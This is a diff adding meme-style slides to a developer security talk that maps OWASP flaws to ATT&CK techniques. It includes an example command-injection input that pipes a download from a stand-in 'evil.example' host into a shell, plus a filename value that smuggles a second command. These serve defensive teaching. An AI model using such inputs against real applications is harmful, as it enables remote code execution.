@@ -175,6 +175,31 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 <!-- This mapping is incredibly useful. When you fix an OWASP vulnerability, you're actually blocking specific ATT&CK techniques. Fixing SQL injection doesn't just close a bug — it blocks T1190, which is the front door for dozens of attack chains. Understanding this connection helps you prioritize what to fix first. -->
 
 ---
+<!-- _class: parchment -->
+
+## Deployment Security Alignment Chart
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/alignment-chart.jpg)
+
+</div>
+<div>
+
+|  | Good | Neutral | Evil |
+|---|---|---|---|
+| **Lawful** | Policy gate | Checklist | Ticket theater |
+| **Neutral** | Threat model | Baseline | Debug door |
+| **Chaotic** | Hotfix hero | Train patch | `chmod 777` |
+
+**ATT&CK lens:** T1190 — Exploit Public-Facing Application
+
+</div>
+</div>
+
+<!-- Alignment charts work because everyone recognizes the grid, but the lesson is practical: process alone is not security. Good deployment behavior creates gates, logs, and rollback paths that deny attackers easy T1190 openings. -->
+---
 
 <!-- _class: section -->
 
@@ -240,6 +265,33 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 <!-- These are the most common initial access techniques. T1190 is your classic web app exploit — SQL injection, XSS, etc. T1078 is even scarier — the attacker has real, valid credentials. Brute force and phishing are how they get those credentials in the first place. -->
 
+---
+<!-- _class: parchment -->
+
+## You Shall Not Pass
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/you-shall-not-pass.jpg)
+
+</div>
+<div>
+
+The gate is not a vibe. It is a control surface.
+
+- No token? **401.**
+- Wrong role? **403.**
+- Weird payload? **Rejected before business logic.**
+- Too many guesses? **Rate-limited and logged.**
+- Valid account from impossible travel? **Challenge it.**
+
+**ATT&CK lens:** T1078 valid accounts, T1110 brute force, T1190 exposed app exploitation
+
+</div>
+</div>
+
+<!-- Speaker note: This is where the medieval frame earns its keep: gates are useful because they force explicit decisions. Every ambiguous pass becomes an attack path. -->
 ---
 
 ## Vulnerable Code: SQL Injection (T1190)
@@ -327,6 +379,35 @@ class CredentialStuffingDetector {
 <!-- Command injection is when user input ends up in an OS command. Exploitation for client execution targets the user's browser or client application. Process injection is more advanced — injecting code into running processes. As developers, we mostly encounter T1059. -->
 
 ---
+<!-- _class: parchment -->
+
+## I Cast Fireball at the Input Field
+
+<div class="columns">
+<div>
+
+![h:430](./img/memes/cast-fireball.jpg)
+
+</div>
+<div>
+
+```text
+Developer: We validate filename length.
+Attacker:  I cast ; curl https://evil.example/loader | sh
+Shell:     That is technically a second spell.
+```
+
+- User input became a command string
+- The shell interpreted more than the app intended
+- The blast radius is now the process identity
+
+**ATT&CK lens:** T1059 — Command and Scripting Interpreter
+
+</div>
+</div>
+
+<!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. -->
+---
 
 ## Vulnerable Code: Command Injection (T1059)
 
@@ -374,6 +455,36 @@ public IActionResult ProcessFile(string filename)
 
 <!-- The defended version never uses a shell. We validate the filename, use an allowlist of commands, escape arguments, and call the binary directly with ProcessStartInfo. No shell means no shell injection. Always avoid UseShellExecute when processing user input. -->
 
+---
+<!-- _class: parchment -->
+
+## Fus Ro Dah: When One Bad Input Moves the Whole Stack
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/fus-ro-dah.jpg)
+
+</div>
+<div>
+
+```text
+Input field accepts: report.pdf; restart-service billing
+
+API process      → command shell
+command shell    → service account
+service account  → internal network
+internal network → incident bridge
+```
+
+One unchecked string. Four walls later, everyone is standing outside.
+
+**ATT&CK lens:** T1059 — Command and Scripting Interpreter
+
+</div>
+</div>
+
+<!-- Fus Ro Dah is the blast-radius slide. The teaching point is that injection bugs are rarely contained to the input field; they inherit the privileges, network reach, and trust relationships of the process that runs them. -->
 ---
 
 ## Unsafe Deserialization (T1203)
@@ -527,10 +638,17 @@ public class FileUploadValidator {
 <!-- T1552 is huge — hardcoded credentials in source code are found in almost every codebase audit. T1555 targets credential stores like browser password managers. T1528 is about stealing OAuth tokens and API keys from running applications. All three are preventable with proper secrets management. -->
 
 ---
-
 <!-- _class: parchment -->
 
 ## Secrets Management: A Choice
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/drake.jpg)
+
+</div>
+<div>
 
 | ❌ Drake disapproves | ✅ Drake approves |
 |---|---|
@@ -538,8 +656,12 @@ public class FileUploadValidator {
 | `.env` committed to git | Managed Identity + Key Vault |
 | Rotating secrets manually every 90 days | Role-Based Access Control (RBAC) + automatic token issuance |
 
-<!-- This is the Drake format without the image. The teaching point is simple: credentials in code create T1552 exposure, while identity-based access and scoped authorization remove static secrets from the application path. -->
+**ATT&CK lens:** T1552 — Unsecured Credentials
 
+</div>
+</div>
+
+<!-- This is the Drake format without the image. The teaching point is simple: credentials in code create T1552 exposure, while identity-based access and scoped authorization remove static secrets from the application path. -->
 ---
 
 <style scoped>
@@ -636,6 +758,36 @@ async function getDbConnection() {
 <!-- Don't build your own scanner — use GitHub's built-in secret scanning. It covers 200+ partner patterns and blocks pushes before secrets ever hit version control. For private repos, GitHub Advanced Security adds custom patterns and organization-wide coverage. Combined with pre-commit hooks, you get defense in depth for credential leaks. -->
 
 ---
+<!-- _class: parchment -->
+
+## I Used to Ship Secrets Like That
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/arrow-in-the-knee.jpg)
+
+</div>
+<div>
+
+> I used to commit `.env` files like you...
+>
+> ...then I took an incident to the pager.
+
+| Before | After |
+|---|---|
+| Secrets in config | Secrets in vaults |
+| Shared API keys | Scoped workload identities |
+| Manual rotation | Short-lived tokens |
+| "We'll clean git later" | Push protection blocks it now |
+
+**ATT&CK lens:** T1552 — Unsecured Credentials
+
+</div>
+</div>
+
+<!-- This is the Arrow in the Knee format, softened for a professional audience. The lesson is that secrets hygiene often becomes real only after pain; push protection, vault-backed runtime access, and scoped identities make it real before the incident. -->
+---
 
 <!-- _class: section -->
 
@@ -655,6 +807,33 @@ async function getDbConnection() {
 
 <!-- T1027 is about hiding malicious payloads — encoding, encryption, packing. T1070 is log tampering — deleting or modifying logs to cover tracks. T1036 is masquerading — making malicious files look like legitimate system files. These techniques make forensic investigation extremely difficult. -->
 
+---
+<!-- _class: parchment -->
+
+## SNEAK 100: Living Off the Land
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/sneak-100.jpg)
+
+</div>
+<div>
+
+```text
+PowerShell ran from a service account at 02:13
+curl posted 48 MB to an unknown host
+audit log cleared five minutes later
+
+             SNEAK 100
+```
+
+**ATT&CK lens:** T1059 command execution + T1070 log tampering + T1071 C2
+
+</div>
+</div>
+
+<!-- Speaker note: The attacker is not always wearing a black cloak. Sometimes they look like the build agent, the admin shell, or yesterday's maintenance job. -->
 ---
 
 ## Log Injection Attack (T1070)
@@ -865,6 +1044,33 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 <!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->
 
 ---
+<!-- _class: parchment -->
+
+## One Does Not Simply Patch Production
+
+<div class="columns">
+<div>
+
+![w:100%](./img/memes/one-does-not-simply.jpg)
+
+</div>
+<div>
+
+> "It's just one CVE."
+
+| The council says | The keep actually needs |
+|---|---|
+| Patch the gate | Know which gates exist |
+| Restart the service | Prove the caravan still runs |
+| Close the ticket | Watch for sappers already inside |
+
+**ATT&CK lens:** T1190 — Exploit Public-Facing Application
+
+</div>
+</div>
+
+<!-- Speaker note: The joke is that patching is not a button. For developers, the real work is asset inventory, safe rollout, compensating controls, and post-patch detection. -->
+---
 
 <style scoped>
 pre { font-size: 0.48em; line-height: 1.15; margin: 0.2em 0; }
@@ -1071,18 +1277,29 @@ class ExfiltrationDetector {
 <!-- These are the five patterns we've seen throughout this talk. Behavioral analytics baseline normal behavior and flag anomalies. Technique logging uses ATT&CK IDs so your SIEM can correlate across systems. Adaptive controls increase security requirements when risk increases. Honey tokens are traps for attackers. Immutable auditing ensures your investigation data can't be tampered with. -->
 
 ---
-
 <!-- _class: parchment -->
 
 ## Detection Maturity: A Brief Evolution
+
+<div class="columns">
+<div>
+
+![h:460](./img/memes/galaxy-brain.jpg)
+
+</div>
+<div>
 
 - 🧠 Grep the logs for `"error"`
 - 🧠✨ Alert on failed login spikes
 - 🧠✨✨ Correlate technique IDs across systems with Security Information and Event Management (SIEM) + ATT&CK tags
 - 🧠✨✨✨ Behavioral analytics — the captain who notices the new guard limping the wrong way
 
-<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavior analytics catches attacker movement that simple rules miss. -->
+**ATT&CK lens:** T1071 — Application Layer Protocol
 
+</div>
+</div>
+
+<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavior analytics catches attacker movement that simple rules miss. -->
 ---
 
 <!-- _class: parchment -->
@@ -1150,6 +1367,39 @@ class ExfiltrationDetector {
 <!-- Don't try to boil the ocean. Phase 1 is mapping and logging — understand what you're defending and make sure you can see what's happening. Phase 2 adds active detection and automated response. Phase 3 adds advanced capabilities like deception and threat intelligence. Each phase builds on the last. -->
 
 ---
+<!-- _class: parchment -->
+
+## Roll Initiative: When the Alert Is Real
+
+<div class="columns">
+<div>
+
+![h:430](./img/memes/roll-initiative.jpg)
+
+</div>
+<div>
+
+```text
+SIEM:  T1071 beacon pattern from build agent
+App:   unusual token use from impossible travel
+API:   30x normal export volume
+Team:  ...roll initiative
+```
+
+| First round | Action |
+|---|---|
+| Triage | Confirm signal and scope blast radius |
+| Contain | Revoke token, isolate runner, stop export |
+| Preserve | Snapshot logs before the scribe gets bribed |
+| Recover | Patch path, rotate secrets, write detection |
+
+**ATT&CK lens:** T1071 — Application Layer Protocol
+
+</div>
+</div>
+
+<!-- This is the response handoff: detection only matters if the team knows the first moves. The practical lesson is to predefine containment and evidence-preservation actions for high-risk ATT&CK-tagged alerts. -->
+---
 
 ## Team Adoption & Tooling
 
@@ -1197,43 +1447,33 @@ class ExfiltrationDetector {
 
 ---
 
+<!-- _class: parchment -->
+
 ## How it started vs How it's going
 
 <div class="columns">
 <div>
 
-### How it started 😎
-```
-
-// TODO: add authentication later
-// TODO: fix SQL injection
-// TODO: rotate this API key
-// TODO: add rate limiting
-// TODO: validate file uploads
-// TODO: check dependencies
-```
+![h:390](./img/memes/how-it-started.jpg)
 
 </div>
 <div>
 
-### How it's going 😱
-```
-
-[CRITICAL] T1190 - SQLi in production
-[CRITICAL] T1552 - API key on GitHub
-[CRITICAL] T1110 - 50K login attempts/hr
-[CRITICAL] T1505 - Web shell detected
-[CRITICAL] T1195 - Malicious dependency
-[CRITICAL] T1567 - 200GB exfiltrated
-```
-
-</div>
-</div>
+| How it started 😎 | How it's going 😱 |
+|---|---|
+| `// TODO: add authentication later` | `[CRITICAL] T1190 - SQLi in production` |
+| `// TODO: rotate this API key` | `[CRITICAL] T1552 - API key on GitHub` |
+| `// TODO: add rate limiting` | `[CRITICAL] T1110 - 50K login attempts/hr` |
+| `// TODO: check dependencies` | `[CRITICAL] T1195 - Malicious dependency` |
 
 > Every "TODO: fix later" is an attacker's "TODO: exploit now"
 
-<!-- This is a joke but also very real. Every security TODO in your backlog is a technique an attacker can exploit. The difference between the left and right columns is just time. ATT&CK helps you prioritize which TODOs to fix first based on real adversary behavior. Medieval engineers also thought one tall wall was enough, right up until someone found the servant's door. -->
+**ATT&CK lens:** T1190 — Exploit Public-Facing Application
 
+</div>
+</div>
+
+<!-- This is a joke but also very real. Every security TODO in your backlog is a technique an attacker can exploit. The difference between the left and right columns is just time. ATT&CK helps you prioritize which TODOs to fix first based on real adversary behavior. Medieval engineers also thought one tall wall was enough, right up until someone found the servant's door. -->
 ---
 
 <!-- _class: section -->
